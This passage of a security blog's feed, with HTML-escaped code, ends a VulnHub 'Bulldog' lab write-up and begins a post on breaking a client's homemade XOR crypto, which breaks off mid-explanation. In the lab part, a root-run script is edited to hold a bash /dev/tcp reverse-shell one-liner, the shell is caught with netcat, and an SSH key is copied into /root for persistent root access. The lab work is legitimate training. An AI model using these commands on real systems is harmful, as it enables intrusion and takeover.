&lt;span class="code-line"&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;We&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;will&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;put&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;full&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;AV&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;here&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;when&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;vendor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;done&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;making&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Alan&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can just get a reverse root shell by modifying the file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;django&lt;/span&gt;&lt;span class="nv"&gt;@bulldog&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hiddenAVDirectory&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;AVApplication&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="err"&gt;#!&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bash&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;bash&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;amp;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dev&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;10.0.2.15&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;4444&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;amp;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And listen client side:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="nv"&gt;@kalili&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;netcat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4444&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;bash&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cannot&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;set&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;terminal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;group&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2145&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Inappropriate&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ioctl&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;device&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;bash&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;no&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;job&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;control&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="nv"&gt;@bulldog&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;congrats&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;cat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;congrats&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Congratulations&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;on&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;completing&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;VM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;That&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;wasn&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;t so bad was it?&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;Let me know what you thought on twitter, I&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;@frichette_n&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;far&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;as&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;I&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;know&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;there&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;are&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;two&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ways&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;get&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Can&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;you&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;other&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;one&lt;/span&gt;&lt;span class="vm"&gt;?&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Perhaps&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sequel&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;will&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;be&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;more&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;challenging&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Until&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;next&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nc"&gt;time&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;I&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hope&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;you&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;enjoyed&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Yeah the other one include reverse engineering which is not my thing :)&lt;/p&gt;
&lt;p&gt;In order to have a complete interactive shell we may just copy our ssh key on the root folder:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cp /home/django.ssh /root -r&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And connect with ssh:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="nv"&gt;@kalili&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;10.0.2.4&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;lroot&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;p23&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Welcome&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Ubuntu&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;16.04.3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;LTS&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;GNU&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Linux&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;4.4.0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;87&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;generic&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;x86_64&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;SNIP&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="nv"&gt;@bulldog&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;DONE.&lt;/p&gt;
&lt;p&gt;Thanks to &lt;a href="https://twitter.com/@frichette_n"&gt;@frichette_n&lt;/a&gt; for the machine and thanks to &lt;a href="https://twitter.com/VulnHub"&gt;@vulnub&lt;/a&gt;.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="vulnhub"></category><category term="hash"></category><category term="boot2root"></category><category term="linux"></category></entry><entry><title>Breaking some homemade crypto</title><link href="https://maggick.fr/2017/08/breaking-some-homemade-crypto.html" rel="alternate"></link><published>2017-08-01T18:00:00+02:00</published><updated>2017-08-01T18:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2017-08-01:/2017/08/breaking-some-homemade-crypto.html</id><summary type="html">&lt;p&gt;I recently did a code review assessment on an application for one of my client.
The best part of the application was their own cryptography algorithm.&lt;/p&gt;
&lt;p&gt;Moreover, the application was written in PHP and PHP do some strange things with
string, characters and XOR operations.
It only needed a few lines of python in order to break it.&lt;/p&gt;
&lt;p&gt;TL;DR : &lt;strong&gt;please do not write your own crypto!&lt;/strong&gt;&lt;/p&gt;
</summary><content type="html">&lt;p&gt;I recently did a code review assessment on an application for one of my client.
The best part of the application was their own cryptography algorithm.&lt;/p&gt;
&lt;p&gt;Moreover, the application was written in PHP and PHP do some strange things with
string, characters and XOR operations.
It only needed a few lines of python in order to break it.&lt;/p&gt;
&lt;p&gt;TL;DR : &lt;strong&gt;please do not write your own crypto!&lt;/strong&gt;&lt;/p&gt;


&lt;p&gt;The cryptography algorithm was a symmetric one, that means there is always a
private key shared between the encryption and the decryption. In fact the
key was shared for the application.&lt;/p&gt;
&lt;h2 id="encryption-algorithm"&gt;Encryption algorithm&lt;/h2&gt;
&lt;p&gt;The encryption algorithm is the following (I rewrote it in python for a better
comprehension):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;crypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;privateKey&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;123456&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;cipherText&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;32000&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;cipherText&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;key2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;privateKey&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key2&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key2&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We observe that there is only XOR operations. Quick reminder about XOR
operations:&lt;/p&gt;
